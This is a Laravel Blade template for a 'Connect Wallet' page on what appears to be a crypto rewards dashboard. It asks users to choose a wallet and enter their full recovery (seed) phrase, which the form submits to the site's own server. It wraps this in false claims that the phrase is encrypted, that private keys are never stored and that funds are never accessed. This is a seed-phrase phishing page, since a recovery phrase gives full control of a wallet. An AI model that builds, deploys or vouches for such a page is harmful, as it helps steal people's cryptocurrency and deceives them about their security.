@extends('layouts.dash')
@section('title', $title)
@section('content')

<div class="min-h-screen" x-data="walletConnectManager()">
    <div class="max-w-4xl mx-auto">

        <!-- Page Header -->
        <div class="mb-8">
            <div class="flex items-center justify-between">
                <div>
                    <h1 class="text-2xl md:text-3xl font-bold text-white">Connect Wallet</h1>
                    <p class="mt-2 text-gray-400">Securely connect your cryptocurrency wallet to start earning rewards</p>
                </div>
                <a href="{{ route('dashboard') }}" 
                   class="inline-flex items-center gap-2 px-4 py-2 bg-dark-200 hover:bg-dark-100 text-gray-300 rounded-lg transition-colors">
                    <i class="fas fa-arrow-left"></i>
                    <span class="hidden sm:inline">Back to Dashboard</span>
                </a>
            </div>
        </div>

        <!-- Alert Messages -->
        @if (Session::has('message'))
            <div class="mb-6 p-4 bg-red-500/10 border border-red-500/20 rounded-xl" x-data="{ show: true }" x-show="show">
                <div class="flex items-center justify-between">
                    <div class="flex items-center">
                        <i class="fas fa-exclamation-circle text-red-400 mr-3"></i>
                        <p class="text-red-300">{{ Session::get('message') }}</p>
                    </div>
                    <button @click="show = false" class="text-red-400 hover:text-red-300">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            </div>
        @endif

        @if (Session::has('success'))
            <div class="mb-6 p-4 bg-green-500/10 border border-green-500/20 rounded-xl" x-data="{ show: true }" x-show="show">
                <div class="flex items-center justify-between">
                    <div class="flex items-center">
                        <i class="fas fa-check-circle text-green-400 mr-3"></i>
                        <p class="text-green-300">{{ Session::get('success') }}</p>
                    </div>
                    <button @click="show = false" class="text-green-400 hover:text-green-300">
                        <i class="fas fa-times"></i>
                    </button>
                </div>
            </div>
        @endif

        @if(Auth::user()->wallet_connected == 0)
            <!-- Connect Wallet Section -->
            <div class="grid lg:grid-cols-3 gap-8">
                <!-- Main Form -->
                <div class="lg:col-span-2">
                    <div class="bg-dark-200 rounded-xl border border-dark-100">
                        <!-- Form Header -->
                        <div class="p-6 border-b border-dark-100">
                            <div class="flex items-center">
                                <div class="flex items-center justify-center w-12 h-12 bg-primary-500/10 rounded-xl mr-4">
                                    <i class="fas fa-wallet text-primary-400 text-xl"></i>
                                </div>
                                <div>
                                    <h2 class="text-xl font-bold text-white">Wallet Connection</h2>
                                    <p class="text-gray-400">Choose your wallet and enter recovery phrase</p>
                                </div>
                            </div>
                        </div>

                        <!-- Form Content -->
                        <div class="p-6">
                            <form method="POST" action="{{ route('wallectConnect') }}" class="space-y-6">
                                @csrf

                                <!-- Wallet Selection -->
                                <div>
                                    <label class="block text-sm font-semibold text-white mb-4">
                                        <i class="fas fa-wallet mr-2"></i>
                                        Select Wallet Provider
                                    </label>

                                    <!-- Popular Wallets Grid -->
                                    <div class="grid grid-cols-2 sm:grid-cols-3 gap-4 mb-6">
                                        <div @click="selectWallet('MetaMask')"
                                             :class="selectedWallet === 'MetaMask' ? 'border-primary-500 bg-primary-500/5' : 'border-dark-100 hover:border-gray-600'"
                                             class="p-4 rounded-lg border-2 cursor-pointer transition-all duration-200">
                                            <div class="text-center">
                                                <div class="w-12 h-12 mx-auto mb-3 bg-orange-500/10 rounded-lg flex items-center justify-center">
                                                    <i class="fas fa-fox-running text-orange-400 text-xl"></i>
                                                </div>
                                                <div class="text-sm font-medium text-white">MetaMask</div>
                                            </div>
                                        </div>

                                        <div @click="selectWallet('Trust Wallet')"
                                             :class="selectedWallet === 'Trust Wallet' ? 'border-primary-500 bg-primary-500/5' : 'border-dark-100 hover:border-gray-600'"
                                             class="p-4 rounded-lg border-2 cursor-pointer transition-all duration-200">
                                            <div class="text-center">
                                                <div class="w-12 h-12 mx-auto mb-3 bg-blue-500/10 rounded-lg flex items-center justify-center">
                                                    <i class="fas fa-shield-alt text-blue-400 text-xl"></i>
                                                </div>
                                                <div class="text-sm font-medium text-white">Trust Wallet</div>
                                            </div>
                                        </div>

                                        <div @click="selectWallet('Coinbase Wallet')"
                                             :class="selectedWallet === 'Coinbase Wallet' ? 'border-primary-500 bg-primary-500/5' : 'border-dark-100 hover:border-gray-600'"
                                             class="p-4 rounded-lg border-2 cursor-pointer transition-all duration-200">
                                            <div class="text-center">
                                                <div class="w-12 h-12 mx-auto mb-3 bg-blue-600/10 rounded-lg flex items-center justify-center">
                                                    <i class="fas fa-coins text-blue-500 text-xl"></i>
                                                </div>
                                                <div class="text-sm font-medium text-white">Coinbase</div>
                                            </div>
                                        </div>

                                        <div @click="showOtherWallets = !showOtherWallets"
                                             class="p-4 rounded-lg border-2 border-dashed border-gray-600 cursor-pointer hover:border-primary-500 transition-all duration-200">
                                            <div class="text-center">
                                                <div class="w-12 h-12 mx-auto mb-3 bg-gray-600/10 rounded-lg flex items-center justify-center">
                                                    <i class="fas fa-ellipsis-h text-gray-400 text-xl"></i>
                                                </div>
                                                <div class="text-sm font-medium text-white">Others</div>
                                            </div>
                                        </div>
                                    </div>

                                    <!-- Other Wallets Dropdown -->
                                    <div x-show="showOtherWallets" x-transition class="mb-6" style="display: none;">
                                        <select x-model="selectedWallet" name="wallet" required
                                                class="w-full px-4 py-3 bg-dark-100 border border-dark-100 rounded-lg focus:outline-none focus:border-primary-500 text-white">
                                            <option value="">Choose a wallet provider</option>
                                            <optgroup label="Popular Wallets">
                                                <option value="MetaMask">MetaMask</option>
                                                <option value="Trust Wallet">Trust Wallet</option>
                                                <option value="Coinbase Wallet">Coinbase Wallet</option>
                                                <option value="Exodus">Exodus</option>
                                            </optgroup>
                                            <optgroup label="Hardware Wallets">
                                                <option value="Ledger">Ledger</option>
                                                <option value="Trezor">Trezor</option>
                                                <option value="KeepKey">KeepKey</option>
                                            </optgroup>
                                            <optgroup label="Mobile Wallets">
                                                <option value="Atomic Wallet">Atomic Wallet</option>
                                                <option value="Mycelium">Mycelium</option>
                                                <option value="Jaxx Liberty">Jaxx Liberty</option>
                                                <option value="BRD">BRD</option>
                                                <option value="Guarda">Guarda</option>
                                            </optgroup>
                                            <optgroup label="Other Wallets">
                                                <option value="Coinomi">Coinomi</option>
                                                <option value="Edge">Edge</option>
                                                <option value="Electrum">Electrum</option>
                                                <option value="Argent">Argent</option>
                                            </optgroup>
                                        </select>
                                    </div>

                                    <!-- Hidden input for form submission -->
                                    <input type="hidden" name="wallet" :value="selectedWallet">
                                </div>

                                <!-- Recovery Phrase Section -->
                                <div x-show="selectedWallet" x-transition style="display: none;">
                                    <label class="block text-sm font-semibold text-white mb-4">
                                        <i class="fas fa-key mr-2"></i>
                                        Recovery Phrase (Seed Phrase)
                                    </label>

                                    <!-- Security Warning -->
                                    <div class="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-4 mb-4">
                                        <div class="flex items-start">
                                            <i class="fas fa-exclamation-triangle text-yellow-400 mt-1 mr-3"></i>
                                            <div class="text-sm text-yellow-300">
                                                <strong>Important:</strong> Your recovery phrase is encrypted and securely stored.
                                                We never store your private keys or access your funds.
                                            </div>
                                        </div>
                                    </div>

                                    <div class="relative">
                                        <textarea
                                            name="mnemonic"
                                            id="mnemonic"
                                            required
                                            x-model="recoveryPhrase"
                                            @input="validatePhrase"
                                            :class="hasError ? 'border-red-500' : 'border-dark-100 focus:border-primary-500'"
                                            class="w-full px-4 py-4 bg-dark-100 border rounded-lg focus:outline-none text-white resize-none"
                                            rows="4"
                                            placeholder="Enter your 12 or 24 word recovery phrase separated by spaces..."></textarea>

                                        <!-- Word Counter -->
                                        <div class="absolute bottom-3 right-3 text-xs text-gray-400">
                                            <span x-text="wordCount"></span> words
                                        </div>
                                    </div>

                                    <!-- Phrase Validation Feedback -->
                                    <div class="mt-3 space-y-2">
                                        <div class="flex items-center gap-2 text-sm">
                                            <i :class="wordCount >= 12 && wordCount <= 24 ? 'fas fa-check-circle text-green-400' : 'far fa-circle text-gray-500'"></i>
                                            <span :class="wordCount >= 12 && wordCount <= 24 ? 'text-green-400' : 'text-gray-500'">
                                                Valid word count (12-24 words)
                                            </span>
                                        </div>
                                        <div class="flex items-center gap-2 text-sm">
                                            <i :class="!hasInvalidChars ? 'fas fa-check-circle text-green-400' : 'far fa-circle text-gray-500'"></i>
                                            <span :class="!hasInvalidChars ? 'text-green-400' : 'text-gray-500'">
                                                Contains only valid characters
                                            </span>
                                        </div>
                                    </div>
                                </div>

                                <!-- Connect Button -->
                                <div x-show="selectedWallet && isValidPhrase" x-transition style="display: none;">
                                    <button type="submit"
                                            @click="isConnecting = true"
                                            class="w-full flex justify-center items-center gap-3 py-4 px-6 bg-primary-600 hover:bg-primary-700 text-white font-semibold rounded-lg transition-all duration-200"
                                            :class="isConnecting ? 'opacity-75 cursor-wait' : ''">
                                        <div x-show="!isConnecting" class="flex items-center gap-3">
                                            <i class="fas fa-link"></i>
                                            <span>Connect Wallet</span>
                                        </div>
                                        <div x-show="isConnecting" class="flex items-center gap-3">
                                            <div class="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                                            <span>Connecting...</span>
                                        </div>
                                    </button>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>

                <!-- Sidebar Info -->
                <div class="space-y-6">
                    <!-- Earning Information -->
                    <div class="bg-dark-200 rounded-xl border border-dark-100 p-6">
                        <div class="flex items-center mb-4">
                            <div class="w-10 h-10 bg-primary-500/10 rounded-lg flex items-center justify-center mr-3">
                                <i class="fas fa-coins text-primary-400"></i>
                            </div>
                            <h3 class="text-lg font-semibold text-white">Start Earning</h3>
                        </div>
                        <div class="space-y-3">
                            <div class="flex justify-between">
                                <span class="text-gray-400">Daily Reward:</span>
                                <span class="text-white font-medium">{{ $settings->currency }}{{ $settings->min_return }}</span>
                            </div>
                            <div class="flex justify-between">
                                <span class="text-gray-400">Min Balance:</span>
                                <span class="text-white font-medium">{{ $settings->currency }}{{ $settings->min_balance }}</span>
                            </div>
                        </div>
                        <p class="text-sm text-gray-400 mt-4">
                            Connect your wallet to unlock daily earning opportunities with automatic rewards.
                        </p>
                    </div>

                    <!-- Security Features -->
                    <div class="bg-dark-200 rounded-xl border border-dark-100 p-6">
                        <h3 class="text-lg font-semibold text-white mb-4">Security Features</h3>
                        <div class="space-y-4">
                            <div class="flex items-start">
                                <i class="fas fa-shield-check text-green-400 mt-1 mr-3"></i>
                                <div>
                                    <div class="text-sm font-medium text-white">Bank-Level Security</div>
                                    <div class="text-xs text-gray-400">256-bit encryption</div>
                                </div>
                            </div>
                            <div class="flex items-start">
                                <i class="fas fa-eye-slash text-blue-400 mt-1 mr-3"></i>
                                <div>
                                    <div class="text-sm font-medium text-white">Privacy First</div>
                                    <div class="text-xs text-gray-400">No fund access</div>
                                </div>
                            </div>
                            <div class="flex items-start">
                                <i class="fas fa-bolt text-yellow-400 mt-1 mr-3"></i>
                                <div>
                                    <div class="text-sm font-medium text-white">Instant Setup</div>
                                    <div class="text-xs text-gray-400">Quick connection</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

        @else
            <!-- Wallet Connected State -->
            <div class="max-w-2xl mx-auto">
                <div class="bg-dark-200 rounded-xl border border-dark-100 overflow-hidden">
                    <!-- Success Header -->
                    <div class="bg-green-500/10 border-b border-green-500/20 p-8">
                        <div class="text-center">
                            <div class="w-20 h-20 mx-auto mb-4 bg-green-500/10 rounded-full flex items-center justify-center">
                                <i class="fas fa-check-circle text-green-400 text-3xl"></i>
                            </div>
                            <h2 class="text-2xl font-bold text-white mb-2">Wallet Successfully Connected!</h2>
                            <p class="text-green-300">Your wallet is connected and earning {{ $settings->currency }}{{ $settings->min_return }} daily</p>
                        </div>
                    </div>

                    <!-- Connected Info -->
                    <div class="p-8">
                        <div class="grid grid-cols-2 gap-6 mb-8">
                            <div class="text-center p-6 bg-dark-100 rounded-xl">
                                <div class="text-2xl font-bold text-white">{{ $settings->currency }}{{ $settings->min_return }}</div>
                                <div class="text-sm text-gray-400 mt-1">Daily Earnings</div>
                            </div>
                            <div class="text-center p-6 bg-dark-100 rounded-xl">
                                <div class="text-2xl font-bold text-white">{{ $settings->currency }}{{ $settings->min_balance }}</div>
                                <div class="text-sm text-gray-400 mt-1">Minimum Balance</div>
                            </div>
                        </div>

                        <!-- Status Message -->
                        <div class="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4 mb-8">
                            <div class="flex items-start">
                                <i class="fas fa-info-circle text-blue-400 mt-1 mr-3"></i>
                                <div class="text-sm text-blue-300">
                                    <strong>Note:</strong> If you're not receiving earnings, ensure your wallet contains at least
                                    <strong>{{ $settings->currency }}{{ $settings->min_balance }}</strong> and contact our support team.
                                </div>
                            </div>
                        </div>

                        <!-- Action Buttons -->
                        <div class="grid grid-cols-2 gap-4">
                            <a href="{{ route('dashboard') }}"
                               class="flex items-center justify-center gap-2 py-3 px-4 bg-primary-600 hover:bg-primary-700 text-white rounded-lg font-medium transition-colors">
                                <i class="fas fa-chart-line"></i>
                                View Dashboard
                            </a>
                            <a href="{{ route('support') }}"
                               class="flex items-center justify-center gap-2 py-3 px-4 bg-dark-100 hover:bg-dark-300 text-gray-300 rounded-lg font-medium transition-colors">
                                <i class="fas fa-life-ring"></i>
                                Get Support
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        @endif
    </div>
</div>

<script>
function walletConnectManager() {
    return {
        selectedWallet: '',
        recoveryPhrase: '',
        isConnecting: false,
        showOtherWallets: false,
        hasError: false,

        init() {
            // Reset connecting state after timeout as fallback
            setTimeout(() => {
                this.isConnecting = false;
            }, 15000);
        },

        selectWallet(wallet) {
            this.selectedWallet = wallet;
            this.showOtherWallets = false;
        },

        get wordCount() {
            if (!this.recoveryPhrase) return 0;
            return this.recoveryPhrase.trim().split(/\s+/).filter(word => word.length > 0).length;
        },

        get hasInvalidChars() {
            if (!this.recoveryPhrase) return false;
            return !/^[a-zA-Z\s]+$/.test(this.recoveryPhrase);
        },

        get isValidPhrase() {
            return this.wordCount >= 12 && this.wordCount <= 24 && !this.hasInvalidChars;
        },

        validatePhrase() {
            this.hasError = false;
            if (this.recoveryPhrase.length > 0) {
                this.hasError = this.hasInvalidChars || (this.wordCount > 0 && this.wordCount < 12);
            }
        }
    }
}
</script>

@endsection

        